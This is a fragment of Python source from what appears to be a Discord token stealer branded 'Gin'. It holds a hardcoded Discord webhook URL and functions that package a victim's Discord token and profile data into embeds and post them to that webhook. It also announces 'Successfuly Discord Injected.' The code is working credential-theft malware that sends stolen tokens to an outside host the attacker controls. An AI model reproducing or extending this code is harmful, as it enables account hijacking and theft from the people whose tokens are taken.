...
hook = "https://discord.com/api/webhooks/1097291473629745315/hJJQirmJ_EflsA16Saweza09rIEbygq--CVK894UeYEgxjUPpatDYnJ_wYM_tb0YdiWU"     
...
def uploadToken(token, path):
    ...
    if pfp == None: 
        pfp = "https://i.pinimg.com/750x/b5/c5/c4/b5c5c4630f7e759ea8a7279e0dfd5f7f.jpg"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "@ginstealer",
                "icon_url": "https://i.pinimg.com/750x/b5/c5/c4/b5c5c4630f7e759ea8a7279e0dfd5f7f.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                },
        ...
        "avatar_url": "https://i.pinimg.com/750x/6e/d4/08/6ed408e1cbeefdada23f31ca4cc0399d.jpg",
        "username": "Gin",
        "attachments": []
        }
...
def upload(name, link):
    ...
    if name == "kiwi":
        ...
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        requests.post(hook, json={'content': f'💉 Successfuly Discord Injected.', "username": 'Gin', "avatar_url": 'https://i.pinimg.com/750x/6e/d4/08/6ed408e1cbeefdada23f31ca4cc0399d.jpg'})
        return
